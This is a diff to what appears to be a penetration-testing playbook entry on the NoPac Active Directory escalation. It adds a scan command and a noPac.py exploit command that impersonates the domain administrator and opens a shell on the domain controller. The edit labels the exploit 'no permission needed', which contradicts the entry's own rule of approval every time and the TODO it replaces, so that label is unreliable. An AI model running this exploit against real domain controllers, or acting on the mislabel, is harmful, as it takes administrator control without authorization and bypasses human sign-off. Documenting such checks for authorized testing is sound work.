@@ -3,8 +3,8 @@
 # 23. NoPac
 
 - **Phase:** Escalation (low-privileged domain account)
-- **Risk:** 🟢 Safe to check *(proposed)*. **The exploit is 🔴 Risky: it creates and renames a computer account and impersonates an administrator on the domain controller.** Approval every time.
-- **Tier:** Recognize *(proposed)*
+- **Risk:** 🟢 Safe to check. **The exploit is 🔴 Risky: it creates and renames a computer account and impersonates an administrator on the domain controller.** Approval every time.
+- **Tier:** Recognize
 - **Finding:** none in the library yet
 - **Runs on:** domain controllers, when unpatched (fixed November 2021)
 - **Ports:** 88 (Kerberos)
@@ -17,7 +17,13 @@ NoPac (CVE-2021-42278 and CVE-2021-42287) chains two flaws in how domain control
 A check shows whether the DC is unpatched without changing anything, which is enough for the finding.
 
 ## Commands
-[[TODO: Copy the commands from the 2024 doc "23. Windows (DC, unpriv login) - NoPac.docx", with the scan first and the exploit marked as needing approval. Format per `templates/finding.md`: numbered steps, exact command in backticks, an "Expected:" line under each.]]
+- **Scanning:**
+`netexec smb <IP ADDRESS> -u <USER> -p <PASSWORD> -M nopac`
+
+- **Exploit (no permission needed):**
+`sudo python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <IP ADDRESS> -dc-host resolute -shell --impersonate administrator -use-ldap`
+
+
 
 ## Evidence to capture
 - `evidence/F-NNN-01.png`: the scan output showing the DC is vulnerable.
